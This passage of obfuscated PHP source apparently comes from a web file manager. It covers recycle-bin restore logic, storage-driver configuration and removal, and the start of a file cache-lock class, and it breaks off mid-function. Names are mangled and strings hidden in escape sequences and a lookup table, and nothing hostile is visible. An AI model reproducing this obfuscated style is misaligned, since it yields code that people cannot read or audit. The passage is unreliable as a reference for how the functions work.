$ë‚‚¦¾’[$ø³Ëõ¿ò] = array($–Ò¦îŸ­[655] => $¤ê’±‡®[$–Ò¦îŸ­[191]], $–Ò¦îŸ­[573] => $¤ê’±‡®[$–Ò¦îŸ­[573]]); $this->where(array($–Ò¦îŸ­[194] => $‚º«šóÊ))->delete(); } foreach ($ë‚‚¦¾’ as $»ÊèƒÖ) { $œ´ÂÆñ->targetSpaceUpdate($»ÊèƒÖ[$–Ò¦îŸ­[191]], $»ÊèƒÖ[$–Ò¦îŸ­[573]]); } } public function restore($åƒÇîÜÌ = false) { $ºÕôÂÚ = $this->listData(); $this->_restoreSource($ºÕôÂÚ, $åƒÇîÜÌ); } public function removeUserAll($º‰ç—Ö”) { $this->remove(!1, $º‰ç—Ö”); } public function restoreItem($¢£ë…§Î) { $this->_restoreSource(array($¢£ë…§Î), array($¢£ë…§Î)); } private function _restoreSource($‰›°½½Û, $ğº¯ÙÙÄ) { $ÖÊâµ©Ã =& $_SERVER[ıÚ˜š²İ]; $ş€¦üé = Model($ÖÊâµ©Ã[1442]); $ğº¯ÙÙÄ = $ğº¯ÙÙÄ == !1 ? !1 : $ğº¯ÙÙÄ; if (!$‰›°½½Û) { return !0; } $ØÔ§ĞÆÙ = array(); foreach ($‰›°½½Û as $°†ÁÊ¨«) { if ($ğº¯ÙÙÄ != !1 && !in_array($°†ÁÊ¨«, $ğº¯ÙÙÄ)) { continue; } $µ’’­õÖ = $ş€¦üé->sourceInfo($°†ÁÊ¨«); $ÛŸ¡†ü = $ş€¦üé->sourceInfo($µ’’­õÖ[$ÖÊâµ©Ã[193]]); if ($ÛŸ¡†ü[$ÖÊâµ©Ã[507]] == $ÖÊâµ©Ã[91]) { continue; } $ş€¦üé->lockMoveStart($°†ÁÊ¨«); $this->recycleMove($°†ÁÊ¨«, 0); if ($µ’’­õÖ[$ÖÊâµ©Ã[487]] == $ÖÊâµ©Ã[91]) { $ºöì·Õæ = array($ÖÊâµ©Ã[659] => array($ÖÊâµ©Ã[619], $µ’’­õÖ[$ÖÊâµ©Ã[588]] . $°†ÁÊ¨« . $ÖÊâµ©Ã[620])); $ş€¦üé->where($ºöì·Õæ)->setField($ÖÊâµ©Ã[507], 0); $this->restoreFolderChildren($°†ÁÊ¨«, $‰›°½½Û); } $this->where(array($ÖÊâµ©Ã[194] => $°†ÁÊ¨«))->delete(); $ş€¦üé->folderSizeReset($µ’’­õÖ[$ÖÊâµ©Ã[193]]); $ØÔ§ĞÆÙ[] = $µ’’­õÖ[$ÖÊâµ©Ã[193]]; if ($µ’’­õÖ[$ÖÊâµ©Ã[487]] == $ÖÊâµ©Ã[91]) { $ØÔ§ĞÆÙ[] = $°†ÁÊ¨«; } $ş€¦üé->lockMoveEnd($°†ÁÊ¨«); } $ş€¦üé->updateModifyTime($ØÔ§ĞÆÙ); } private function restoreFolderChildren($šÒ™ëµ¿, $šŸ†ìâä) { $¥´ÎÆıÔ =& $_SERVER[ıÚ˜š²İ]; $Ù‚ÂöÉ = Model($¥´ÎÆıÔ[1442]); $òø¤Ì = array($¥´ÎÆıÔ[194] => array($¥´ÎÆıÔ[7], array())); foreach ($šŸ†ìâä as $¤·ğñçŒ) { if ($¤·ğñçŒ == $šÒ™ëµ¿) { continue; } if (!$Ù‚ÂöÉ->isParentOf($šÒ™ëµ¿, $¤·ğñçŒ)) { continue; } $šØ•ôû = $Ù‚ÂöÉ->sourceInfo($¤·ğñçŒ); if ($šØ•ôû[$¥´ÎÆıÔ[487]] == $¥´ÎÆıÔ[91]) { $òø¤Ì[] = array($¥´ÎÆıÔ[659] => array($¥´ÎÆıÔ[619], $šØ•ôû[$¥´ÎÆıÔ[588]] . $¤·ğñçŒ . $¥´ÎÆıÔ[620])); } else { $òø¤Ì[$¥´ÎÆıÔ[194]][1][] = $¤·ğñçŒ; } } if (!$òø¤Ì[$¥´ÎÆıÔ[194]][1]) { unset($òø¤Ì[$¥´ÎÆıÔ[194]]); } if (!$òø¤Ì) { return; } if (is_array($òø¤Ì[$¥´ÎÆıÔ[194]]) && is_array($òø¤Ì[$¥´ÎÆıÔ[194]][1])) { $òø¤Ì[$¥´ÎÆıÔ[194]][1] = array_unique($òø¤Ì[$¥´ÎÆıÔ[194]][1]); } $òø¤Ì[$¥´ÎÆıÔ[1089]] = $¥´ÎÆıÔ[2096]; $Ù‚ÂöÉ->where($òø¤Ì)->setField($¥´ÎÆıÔ[507], 1); } private function recycleMove($¨ıÖı¯», $ãÏî‡»À = 1) { $€Ô…â‹£ =& $_SERVER[ıÚ˜š²İ]; $ÑÂå¤™ = Model($€Ô…â‹£[1442]); $æƒÇ•™Ÿ = Model($€Ô…â‹£[2326]); $Ëñø‚® = array($€Ô…â‹£[194] => $¨ıÖı¯»); if ($ãÏî‡»À) { $ÑÂå¤™->where($Ëñø‚®)->setField($€Ô…â‹£[507], 1); $æƒÇ•™Ÿ->eventRecycle($¨ıÖı¯», $€Ô…â‹£[2327]); } else { $É¼µ Ô = $ÑÂå¤™->where($Ëñø‚®)->find(); $„æ–“İ‰ = $É¼µ Ô[$€Ô…â‹£[487]] == $€Ô…â‹£[91]; $ÃÃÍ‰üÂ = $ÑÂå¤™->fileNameAuto($É¼µ Ô[$€Ô…â‹£[193]], $É¼µ Ô[$€Ô…â‹£[32]], REPEAT_RENAME_FOLDER, $„æ–“İ‰); if ($ÃÃÍ‰üÂ != $É¼µ Ô[$€Ô…â‹£[32]]) { $ÑÂå¤™->rename($¨ıÖı¯», $ÃÃÍ‰üÂ); } $ÑÂå¤™->where($Ëñø‚®)->setField($€Ô…â‹£[507], 0); $æƒÇ•™Ÿ->eventRecycle($¨ıÖı¯», $€Ô…â‹£[2328]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\56\163\157\x75\x72\143\145\123\145\x63\x72\145\x74\x4c\151\163\164"; public $field = array("\163\157\165\162\x63\145\111\x44", "\164\171\x70\145\x49\104", "\143\x72\145\141\x74\145\x55\x73\145\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\x6d\56\x73\164\x6f\x72\x61\x67\145\114\151\163\164"; public $field = array("\156\x61\x6d\145", "\163\151\172\x65\x4d\141\170", "\163\x79\x73\x74\x65\x6d", "\144\x65\x66\x61\165\154\x74", "\144\x72\x69\x76\145\162", "\143\157\x6e\x66\x69\147"); public function listData($ûœõƒ›« = false, $ñŞ¶òŠé = "\155\157\x64\x69\x66\171\124\x69\x6d\145", $ÔÅ­şÆ = false) { $ÓšÎˆóÌ =& $_SERVER[ıÚ˜š²İ]; $œŒ«ÏÙ = parent::listData($ûœõƒ›«, $ñŞ¶òŠé, $ÔÅ­şÆ); if ($ûœõƒ›«) { return $œŒ«ÏÙ; } $á’Ä¥ğ = array(); if ($GLOBALS[$ÓšÎˆóÌ[2329]]) { $á’Ä¥ğ = $this->ioSizeUseGet(array_to_keyvalue($œŒ«ÏÙ, $ÓšÎˆóÌ[12], $ÓšÎˆóÌ[477])); } foreach ($œŒ«ÏÙ as $Õ¤³†ßÀ => $îĞ–¥…ï) { unset($œŒ«ÏÙ[$Õ¤³†ßÀ][$ÓšÎˆóÌ[6]]); $œŒ«ÏÙ[$Õ¤³†ßÀ][$ÓšÎˆóÌ[1982]] = isset($á’Ä¥ğ[$îĞ–¥…ï[$ÓšÎˆóÌ[477]]]) ? $á’Ä¥ğ[$îĞ–¥…ï[$ÓšÎˆóÌ[477]]] : 0; } return $œŒ«ÏÙ; } public function ioSizeUseGet($ò½ª¥öò) { $ÕçòÃÑƒ =& $_SERVER[ıÚ˜š²İ]; if (!$ò½ª¥öò) { return array(); } $”›õ‚‘‡ = $ÕçòÃÑƒ[2330] . implode($ÕçòÃÑƒ[50], $ò½ª¥öò); $Ó‡„û¿ª = Cache::get($”›õ‚‘‡); if ($Ó‡„û¿ª) { return $Ó‡„û¿ª; } $’‡ìßÏ = array($ÕçòÃÑƒ[900] => $ÕçòÃÑƒ[477], $ÕçòÃÑƒ[2331] => $ÕçòÃÑƒ[79]); $¸±ºòƒ™ = array($ÕçòÃÑƒ[900] => array($ÕçòÃÑƒ[7], $ò½ª¥öò)); $Ó‡„û¿ª = Model($ÕçòÃÑƒ[868])->field($’‡ìßÏ)->where($¸±ºòƒ™)->group($ÕçòÃÑƒ[900])->select(); $Ó‡„û¿ª = array_to_keyvalue($Ó‡„û¿ª, $ÕçòÃÑƒ[477], $ÕçòÃÑƒ[79]); Cache::set($”›õ‚‘‡, $Ó‡„û¿ª, 600); return $Ó‡„û¿ª; } public function getConfig($õ¶ÜßÓç) { $˜³×Îª´ = parent::listData($õ¶ÜßÓç); $å¤”…«• = _get($˜³×Îª´, $_SERVER[ıÚ˜š²İ][6], array()); if ($å¤”…«• && !is_array($å¤”…«•)) { $å¤”…«• = json_decode($å¤”…«•, !0); } return $å¤”…«•; } public function update($§İâÈÊ, $¶ÍÊí¾‘) { $ü¥ã§­¢ =& $_SERVER[ıÚ˜š²İ]; $¼™İÖ¨¤ = $¶ÍÊí¾‘[$ü¥ã§­¢[32]]; $÷øüˆ® = array_to_keyvalue(parent::listData(), $ü¥ã§­¢[32]); if (isset($÷øüˆ®[$¼™İÖ¨¤]) && $÷øüˆ®[$¼™İÖ¨¤][$ü¥ã§­¢[477]] != $§İâÈÊ) { return !1; } $this->checkPwd($§İâÈÊ, $¶ÍÊí¾‘); if (isset($¶ÍÊí¾‘[$ü¥ã§­¢[2332]]) && $¶ÍÊí¾‘[$ü¥ã§­¢[2332]] == $ü¥ã§­¢[91]) { $this->checkConfig($¶ÍÊí¾‘); } unset($¶ÍÊí¾‘[$ü¥ã§­¢[2332]]); $–³™Şƒ‹ = parent::update($§İâÈÊ, $¶ÍÊí¾‘); if ($–³™Şƒ‹ && $¶ÍÊí¾‘[$ü¥ã§­¢[37]]) { foreach ($÷øüˆ® as $êŠ î­¿) { if ($êŠ î­¿[$ü¥ã§­¢[37]] && $êŠ î­¿[$ü¥ã§­¢[477]] != $§İâÈÊ) { parent::update($êŠ î­¿[$ü¥ã§­¢[477]], array($ü¥ã§­¢[37] => 0)); } } $this->updateBackup($§İâÈÊ, $÷øüˆ®); } return $–³™Şƒ‹; } public function add($ÖŠĞğ´) { $ÅàÆ¾´ =& $_SERVER[ıÚ˜š²İ]; $åÉ”¼Ğä = array_to_keyvalue(parent::listData(), $ÅàÆ¾´[32]); if (isset($åÉ”¼Ğä[$ÖŠĞğ´[$ÅàÆ¾´[32]]])) { return !1; } $this->checkConfig($ÖŠĞğ´); $²Ù¬ÇÁ = parent::insert($ÖŠĞğ´); if ($²Ù¬ÇÁ && $ÖŠĞğ´[$ÅàÆ¾´[37]]) { foreach ($åÉ”¼Ğä as $Öüô— ) { if ($Öüô— [$ÅàÆ¾´[37]]) { parent::update($Öüô— [$ÅàÆ¾´[477]], array($ÅàÆ¾´[37] => 0)); } } $this->updateBackup($²Ù¬ÇÁ, $åÉ”¼Ğä); } return $²Ù¬ÇÁ; } public function updateBackup($µ¦ÕÛ°Ö, $Åïúµ©) { $±şâŒ‰ =& $_SERVER[ıÚ˜š²İ]; if ($µ¦ÕÛ°Ö == $±şâŒ‰[91]) { return; } $±µ„‡ä = Model($±şâŒ‰[824])->config(); $éŞ×ÒÓ€ = $±µ„‡ä[$±şâŒ‰[828]]; if ($±µ„‡ä[$±şâŒ‰[1761]] != $±şâŒ‰[91] || $éŞ×ÒÓ€ == $µ¦ÕÛ°Ö) { return; } if ($éŞ×ÒÓ€ != $±şâŒ‰[91]) { $ÔÕæˆ·Í = array(); foreach ($Åïúµ© as $Ç­ÔóƒÉ) { if ($µ¦ÕÛ°Ö == $Ç­ÔóƒÉ[$±şâŒ‰[477]]) { continue; } $ÔÕæˆ·Í[] = $Ç­ÔóƒÉ[$±şâŒ‰[477]]; } if ($ÔÕæˆ·Í && in_array($éŞ×ÒÓ€, $ÔÕæˆ·Í)) { return; } } $¾Ö÷­ÍÄ = Model($±şâŒ‰[847])->get($±şâŒ‰[854]); $¾Ö÷­ÍÄ = json_decode($¾Ö÷­ÍÄ, !0); if (!$¾Ö÷­ÍÄ) { return; } $¾Ö÷­ÍÄ[$±şâŒ‰[828]] = $µ¦ÕÛ°Ö; Model($±şâŒ‰[847])->set(array($±şâŒ‰[854] => $¾Ö÷­ÍÄ)); } public function checkPwd($…ßôÉ‚Ç, &$î£ä´ƒ) { $ ‰ìóÅô =& $_SERVER[ıÚ˜š²İ]; if (empty($î£ä´ƒ[$ ‰ìóÅô[6]])) { return; } $ñœËŒµ“ = $î£ä´ƒ[$ ‰ìóÅô[6]]; if (!is_array($ñœËŒµ“)) { $ñœËŒµ“ = json_decode($ñœËŒµ“, !0); } $§æßóÄ = $ ‰ìóÅô[12]; $ğäğ’ß = array($ ‰ìóÅô[2333], $ ‰ìóÅô[2334], $ ‰ìóÅô[978]); foreach ($ğäğ’ß as $İ˜¼Á¦á) { if (isset($ñœËŒµ“[$İ˜¼Á¦á])) { $§æßóÄ = $İ˜¼Á¦á; break; } } if (!$§æßóÄ) { return; } $¡Â³Úˆ = $this->getConfig($…ßôÉ‚Ç); $Í”µî–á = $¡Â³Úˆ[$§æßóÄ]; $”È¡Ø¦† = $ñœËŒµ“[$§æßóÄ]; if ($”È¡Ø¦† == str_repeat($ ‰ìóÅô[223], strlen($Í”µî–á))) { $ñœËŒµ“[$§æßóÄ] = $Í”µî–á; $î£ä´ƒ[$ ‰ìóÅô[6]] = json_encode($ñœËŒµ“); } else { if ($”È¡Ø¦† != $Í”µî–á) { $î£ä´ƒ[$ ‰ìóÅô[2332]] = $ ‰ìóÅô[91]; } } } public function checkConfig(&$§ôè™¢§, $Ş‹µ¯…å = false) { $ã¦¥™» =& $_SERVER[ıÚ˜š²İ]; $ËƒÅÌŠä = strtolower($§ôè™¢§[$ã¦¥™»[98]]); $Åº…Šë¹ = $§ôè™¢§[$ã¦¥™»[6]]; if (!is_array($Åº…Šë¹)) { $Åº…Šë¹ = json_decode($Åº…Šë¹, !0); } foreach ($Åº…Šë¹ as $şÉûÕØ => $äºé™¿õ) { if (is_string($äºé™¿õ)) { $Åº…Šë¹[$şÉûÕØ] = trim($äºé™¿õ); } } $Åº…Šë¹[$ã¦¥™»[2335]] = rand_string(6); $ï€£İÎ¿ = $GLOBALS[$ã¦¥™»[6]][$ã¦¥™»[92]][$ã¦¥™»[908]]; $¼Öˆ‰Ô« = isset($ï€£İÎ¿[$ËƒÅÌŠä]) ? $ï€£İÎ¿[$ËƒÅÌŠä] : ucfirst($ËƒÅÌŠä); $¡ü‹ñÜï = $ã¦¥™»[77] . $¼Öˆ‰Ô«; if (!$¼Öˆ‰Ô« || !class_exists($¡ü‹ñÜï)) { if ($Ş‹µ¯…å) { return LNG($ã¦¥™»[2336]); } write_log(array($ã¦¥™»[2337], $§ôè™¢§, get_caller_info()), $ã¦¥™»[216]); show_json(LNG($ã¦¥™»[2336]), !1, $§ôè™¢§); } $å‰¹¢õÜ = new $¡ü‹ñÜï($Åº…Šë¹); $şÒÍ‘Ó‰ = rtrim($Åº…Šë¹[$ã¦¥™»[1276]], $ã¦¥™»[8]) . $ã¦¥™»[8]; if (in_array($ËƒÅÌŠä, $å‰¹¢õÜ->objectDriver)) { try { if (!$å‰¹¢õÜ->isBucketCors() && !$å‰¹¢õÜ->setBucketCors()) { $²²Œ—›€ = LNG($ã¦¥™»[2338]); $²²Œ—›€ .= $ã¦¥™»[2339] . LNG($ã¦¥™»[2340]); } } catch (Exception $–ê‹±‡) { $²²Œ—›€ = $–ê‹±‡->getMessage(); } if (isset($²²Œ—›€)) { return $this->_parseError($²²Œ—›€, $ËƒÅÌŠä, $Ş‹µ¯…å); } if ($ËƒÅÌŠä == $ã¦¥™»[68] && !$å‰¹¢õÜ->checkRegion()) { return $this->_parseError(LNG($ã¦¥™»[2341]), $ËƒÅÌŠä, $Ş‹µ¯…å); } } else { if ($ËƒÅÌŠä == $ã¦¥™»[2342]) { if ($å‰¹¢õÜ->ftpPath) { $•Ğß£¹¯ = trim($şÒÍ‘Ó‰, $ã¦¥™»[8]); if (stripos($•Ğß£¹¯, trim($å‰¹¢õÜ->ftpPath, $ã¦¥™»[8])) !== 0) { $şÒÍ‘Ó‰ = $å‰¹¢õÜ->ftpPath . $ã¦¥™»[8] . ($•Ğß£¹¯ ? $•Ğß£¹¯ . $ã¦¥™»[8] : $ã¦¥™»[12]); } } } } $­¾ö”ßÅ = $å‰¹¢õÜ->getPath($şÒÍ‘Ó‰ . $ã¦¥™»[1280]); try { if ($ËƒÅÌŠä == $ã¦¥™»[109]) { $å‰¹¢õÜ->mkdir($şÒÍ‘Ó‰); } $’¸÷¿¯â = $å‰¹¢õÜ->mkfile($­¾ö”ßÅ); if (!$’¸÷¿¯â) { $²²Œ—›€ = LNG($ã¦¥™»[2338]); } } catch (Exception $–ê‹±‡) { $²²Œ—›€ = $–ê‹±‡->getMessage(); } if (isset($²²Œ—›€)) { return $this->_parseError($²²Œ—›€, $ËƒÅÌŠä, $Ş‹µ¯…å); } $Åº…Šë¹[$ã¦¥™»[1276]] = $şÒÍ‘Ó‰; $§ôè™¢§[$ã¦¥™»[6]] = json_encode($Åº…Šë¹); $§ôè™¢§[$ã¦¥™»[98]] = $¼Öˆ‰Ô«; return !0; } private function _parseError($ú®›ÄâÁ, $ôô•”Ë“, $ğ¼Û©°Ì = false) { $¾ÜĞ² =& $_SERVER[ıÚ˜š²İ]; if ($ôô•”Ë“ == $¾ÜĞ²[68] && stripos($ú®›ÄâÁ, $¾ÜĞ²[2343])) { $Íé®ºÎ¬ = explode($¾ÜĞ²[10], $ú®›ÄâÁ); $¨³Ü—ôß = isset($Íé®ºÎ¬[1]) ? $Íé®ºÎ¬[1] : $¾ÜĞ²[12]; $äÒ¨£â = array($¾ÜĞ²[2344] => LNG($¾ÜĞ²[2345]), $¾ÜĞ²[2346] => LNG($¾ÜĞ²[2347])); if (isset($äÒ¨£â[$¨³Ü—ôß])) { $ú®›ÄâÁ = $äÒ¨£â[$¨³Ü—ôß]; } } if (stripos($ú®›ÄâÁ, $¾ÜĞ²[2348]) === 0) { $´¼â€ = strpos($ú®›ÄâÁ, $¾ÜĞ²[178]); if ($´¼â€ === !1) { $´¼â€ = strpos($ú®›ÄâÁ, $¾ÜĞ²[4]); } if ($´¼â€ !== !1) { $ú®›ÄâÁ = substr($ú®›ÄâÁ, $´¼â€ + 1); } } $ú®›ÄâÁ = LNG($¾ÜĞ²[1283]) . $ú®›ÄâÁ; if ($ğ¼Û©°Ì) { return $ú®›ÄâÁ; } show_json($ú®›ÄâÁ, !1); } public function driverListSystem() { $§°ÄÆ† =& $_SERVER[ıÚ˜š²İ]; $Ì®Œï¼™ = parent::listData(); $¥ø“ “ˆ = array(); foreach ($Ì®Œï¼™ as $»ØÍ’“) { unset($»ØÍ’“[$§°ÄÆ†[234]], $»ØÍ’“[$§°ÄÆ†[88]]); if (!is_array($»ØÍ’“[$§°ÄÆ†[6]])) { $»ØÍ’“[$§°ÄÆ†[6]] = json_decode($»ØÍ’“[$§°ÄÆ†[6]], !0); } $¥ø“ “ˆ[] = $»ØÍ’“; } return $¥ø“ “ˆ; } public function defaultDriver() { $áÎÒŒ÷ô =& $_SERVER[ıÚ˜š²İ]; $áåƒÎüë = parent::listData(); $¼µÛÀ¤™ = array_filter_by_field($áåƒÎüë, $áÎÒŒ÷ô[37], 1); $¼µÛÀ¤™ = $¼µÛÀ¤™[0]; if (!$¼µÛÀ¤™) { return array(); } if (!is_array($¼µÛÀ¤™[$áÎÒŒ÷ô[6]])) { $¼µÛÀ¤™[$áÎÒŒ÷ô[6]] = json_decode($¼µÛÀ¤™[$áÎÒŒ÷ô[6]], !0); } return $¼µÛÀ¤™; } public function driverInfo($ğÜ¶“¸ø) { $¬áˆù°ê =& $_SERVER[ıÚ˜š²İ]; $€€„´ = array_to_keyvalue(parent::listData(), $¬áˆù°ê[477]); if (!isset($€€„´[$ğÜ¶“¸ø])) { return !1; } $ÉúÖÎ· = $€€„´[$ğÜ¶“¸ø]; if (!is_array($ÉúÖÎ·[$¬áˆù°ê[6]])) { $ÉúÖÎ·[$¬áˆù°ê[6]] = json_decode($ÉúÖÎ·[$¬áˆù°ê[6]], !0); } return $ÉúÖÎ·; } public function remove($¨ÏèùïÍ) { $this->removeShareItems($¨ÏèùïÍ); return parent::remove($¨ÏèùïÍ); } public function removeWithFile($à³ÓÃĞÃ, $ãá¢¨ñÜ, $ñª®Ü™Ù, $ã©¢çÓĞ = false) { $è¢îğŸ– =& $_SERVER[ıÚ˜š²İ]; $¨¯¹× = array($è¢îğŸ–[900] => $à³ÓÃĞÃ); $Œğûûœ = Model($è¢îğŸ–[548])->where($¨¯¹×)->count(); $Â¿Ç½½æ = Model($è¢îğŸ–[548])->where($¨¯¹×)->sum($è¢îğŸ–[79]); $ÍíàÌ£À = $ãá¢¨ñÜ . $è¢îğŸ–[2349] . $à³ÓÃĞÃ; $Ñî¼Ûå¨ = LNG($ãá¢¨ñÜ == $è¢îğŸ–[627] ? $è¢îğŸ–[2350] : $è¢îğŸ–[2351]); $»¨ÁáŸÇ = new TaskFileTransfer($ÍíàÌ£À, $è¢îğŸ–[216], $Œğûûœ, $Ñî¼Ûå¨ . $è¢îğŸ–[464] . $ñª®Ü™Ù[$è¢îğŸ–[32]] . $è¢îğŸ–[215] . $à³ÓÃĞÃ); $»¨ÁáŸÇ->task[$è¢îğŸ–[840]] = (double) $Â¿Ç½½æ; $¿£‘ôì¢ = KodIO::defaultDriver(); $‰ÔŞ…Ï× = $¿£‘ôì¢[$è¢îğŸ–[477]]; $–Å¢”Ùç = $‚©à¡ò° = $„ııöÆš = array(); $“ò„ÕÍù = Model($è¢îğŸ–[233])->where($¨¯¹×)->field($è¢îğŸ–[2352])->select(); foreach ($“ò„ÕÍù as $²Üì×Î) { $Çû†Î•Â = $²Üì×Î[$è¢îğŸ–[545]]; if ($ã©¢çÓĞ) { $‚©à¡ò°[] = $Çû†Î•Â; continue; } $öÀä½Ö¯ = $²Üì×Î[$è¢îğŸ–[87]]; $°ÛûÓ¯ = get_path_father($öÀä½Ö¯); $„ııöÆš[] = $°ÛûÓ¯; $°ÛûÓ¯ = str_replace("\x7b\x69\x6f\72{$à³ÓÃĞÃ}\175\x2f", "\x7b\151\157\x3a{$‰ÔŞ…Ï×}\x7d\57", $°ÛûÓ¯); if (!IO::exist($öÀä½Ö¯)) { $–Å¢”Ùç[] = $Çû†Î•Â; $»¨ÁáŸÇ->updateFileEnd($²Üì×Î[$è¢îğŸ–[32]], $²Üì×Î[$è¢îğŸ–[79]]); write_log($è¢îğŸ–[2353] . $öÀä½Ö¯, $è¢îğŸ–[1925]); continue; } $¿ö¸ò‰´ = IO::move($öÀä½Ö¯, $°ÛûÓ¯, REPEAT_RENAME); if (!$¿ö¸ò‰´) { $‚©à¡ò°[] = $Çû†Î•Â; $»¨ÁáŸÇ->updateFileEnd($²Üì×Î[$è¢îğŸ–[32]], $²Üì×Î[$è¢îğŸ–[79]]); write_log($è¢îğŸ–[2354] . $öÀä½Ö¯, $è¢îğŸ–[1925]); continue; } $¨¯¹× = array($è¢îğŸ–[545] => $Çû†Î•Â); $÷íé›ß­ = array($è¢îğŸ–[900] => $‰ÔŞ…Ï×, $è¢îğŸ–[87] => $¿ö¸ò‰´); Model($è¢îğŸ–[233])->where($¨¯¹×)->save($÷íé›ß­); } $€£ÈÆÚó = $»¨ÁáŸÇ->task; if (!$ã©¢çÓĞ) { Cache::set($ÍíàÌ£À, $€£ÈÆÚó); } $»¨ÁáŸÇ->end(); $–Å¢”Ùç = array_unique($–Å¢”Ùç); $‚©à¡ò° = array_unique($‚©à¡ò°); if (!$ã©¢çÓĞ && ($–Å¢”Ùç || $‚©à¡ò°)) { $ñÁ¢Êø÷ = array(); if ($–Å¢”Ùç) { $ñÁ¢Êø÷[] = sprintf(LNG($è¢îğŸ–[2355]), count($–Å¢”Ùç)); } if ($‚©à¡ò°) { $ñÁ¢Êø÷[] = sprintf(LNG($è¢îğŸ–[2356]), count($‚©à¡ò°)); } $ñÁ¢Êø÷ = sprintf(LNG($è¢îğŸ–[2357]), implode($è¢îğŸ–[2358], $ñÁ¢Êø÷)) . $è¢îğŸ–[2359] . date($è¢îğŸ–[2360]) . $è¢îğŸ–[2361]; if ($ãá¢¨ñÜ == $è¢îğŸ–[1962]) { $ñÁ¢Êø÷ .= $è¢îğŸ–[2362] . LNG($è¢îğŸ–[2363]); } else { $ñÁ¢Êø÷ = LNG($è¢îğŸ–[2364]) . $è¢îğŸ–[2365] . $ñÁ¢Êø÷; } $€£ÈÆÚó[$è¢îğŸ–[1278]] = $ñÁ¢Êø÷; Cache::set($ÍíàÌ£À, $€£ÈÆÚó); unset($ñª®Ü™Ù[$è¢îğŸ–[6]]); $åÀçêö‰ = array($è¢îğŸ–[477] => $à³ÓÃĞÃ, $è¢îğŸ–[2234] => $è¢îğŸ–[627], $è¢îğŸ–[32] => $ñª®Ü™Ù[$è¢îğŸ–[32]], $è¢îğŸ–[98] => $ñª®Ü™Ù[$è¢îğŸ–[98]]); Hook::trigger($è¢îğŸ–[1803], array($è¢îğŸ–[1301] => $åÀçêö‰, $è¢îğŸ–[1311] => !0)); show_json($ñÁ¢Êø÷, !1, 100111); } if ($ãá¢¨ñÜ == $è¢îğŸ–[627]) { return !0; } if ($–Å¢”Ùç || $‚©à¡ò°) { $“çÈÀû€ = array_merge($–Å¢”Ùç, $‚©à¡ò°); $“çÈÀû€ = array_filter(array_unique($“çÈÀû€)); $this->removeByFileID($“çÈÀû€); } if ($„ııöÆš) { $„ııöÆš = array_filter(array_unique($„ııöÆš)); foreach ($„ııöÆš as $öÀä½Ö¯) { $´êó‹ƒ€ = IO::has($öÀä½Ö¯, !0); if (!$´êó‹ƒ€[$è¢îğŸ–[242]] && !$´êó‹ƒ€[$è¢îğŸ–[243]]) { IO::remove($öÀä½Ö¯); } } } return $this->remove($à³ÓÃĞÃ); } private function removeByFileID($Ï¨ä¹  = array()) { $±È¼¾ıÏ =& $_SERVER[ıÚ˜š²İ]; if (empty($Ï¨ä¹ )) { return; } $ÛËİ¼“İ = array($±È¼¾ıÏ[545] => array($±È¼¾ıÏ[7], $Ï¨ä¹ )); $Âï¹œ±¡ = Model($±È¼¾ıÏ[1442])->where($ÛËİ¼“İ)->field($±È¼¾ıÏ[2310])->select(); if (!$Âï¹œ±¡) { return Model($±È¼¾ıÏ[548])->remove($Ï¨ä¹ ); } $Âï¹œ±¡ = array_to_keyvalue($Âï¹œ±¡, $±È¼¾ıÏ[194], $±È¼¾ıÏ[545]); foreach ($Âï¹œ±¡ as $ôêëŸ»‹ => $âĞÙºüå) { Model($±È¼¾ıÏ[907])->removeNow($ôêëŸ»‹, !1); } $ÂŸß±ù = array_diff($Ï¨ä¹ , array_unique(array_values($Âï¹œ±¡))); if ($ÂŸß±ù) { return Model($±È¼¾ıÏ[548])->remove($ÂŸß±ù); } } private function removeShareItems($×ú¤ãÎÀ) { $Ù¸­Óış =& $_SERVER[ıÚ˜š²İ]; $¿Ú‹Ë = "\173\151\x6f\72{$×ú¤ãÎÀ}\x7d\57"; $¹ü¬…† = array($Ù¸­Óış[194] => 0, $Ù¸­Óış[1271] => array($Ù¸­Óış[461], "{$¿Ú‹Ë}\45")); $Â½Æ¥Å½ = Model($Ù¸­Óış[1973])->where($¹ü¬…†)->field($Ù¸­Óış[672])->select(); if (empty($Â½Æ¥Å½)) { return; } $²şóü = array_to_keyvalue($Â½Æ¥Å½, $Ù¸­Óış[12], $Ù¸­Óış[672]); Model($Ù¸­Óış[671])->remove($²şóü); } } goto F¦ªêñÁä; E‡àîÉÈÛ: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $Ğöç°¯¬ =& $_SERVER[ıÚ˜š²İ]; $Í¹œüåÊ = $GLOBALS[$Ğöç°¯¬[6]][$Ğöç°¯¬[426]]; self::$cachePath = $Í¹œüåÊ[$Ğöç°¯¬[233]][$Ğöç°¯¬[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($à…Ğ‹ î, $«ü«Ôë„ = 0) { $Ì­ìŞû‡ =& $_SERVER[ıÚ˜š²İ]; $´ÖÆöÃ‘ = microtime(!0); $é½ á¾ = $´ÖÆöÃ‘ + $«ü«Ôë„ + 0.0001; $ç¿œîô· = rtrim(self::$cachePath, $Ì­ìŞû‡[8]) . $Ì­ìŞû‡[947] . md5($à…Ğ‹ î) . $Ì­ìŞû‡[944]; if (file_exists($ç¿œîô·) && filemtime($ç¿œîô·) && filemtime($ç¿œîô·) < time() - 10) { @unlink($ç¿œîô·); } do { if (file_exists($ç¿œîô·)) { cacheLockWait(); continue; } $¦áÙ Â = fopen($ç¿œîô·, $Ì­ìŞû‡[948]); if (!$¦áÙ Â) { return !1; } $¯±Ğª×ë = flock($¦áÙ Â, LOCK_EX | LOCK_NB); self::$caches[$à…Ğ‹ î] = array($Ì­ìŞû‡[949] => $¦áÙ Â, $Ì­ìŞû‡[233] => $ç¿œîô·); fwrite($¦áÙ Â, $é½ á¾); clearstatcache(); if ($¦áÙ Â && $¯±Ğª×ë) { return !0; } cacheLockWait(); } while (microtime(!0) < $é½ á¾); $this->unlock($à…Ğ‹ î); return !1; } public function lockGet($÷ıç¨µ‡) { $ô‹Œ¡ş™ =& $_SERVER[ıÚ˜š²İ]; $İîºØœá = rtrim(self::$cachePath, $ô‹Œ¡ş™[8]) . $ô‹Œ¡ş™[947] . md5($÷ıç¨µ‡) . $ô‹Œ¡ş™[944]; return file_exists($İîºØœá); } public function unlock($ßÖËšñÈ) { $±¿ş»Œò =& 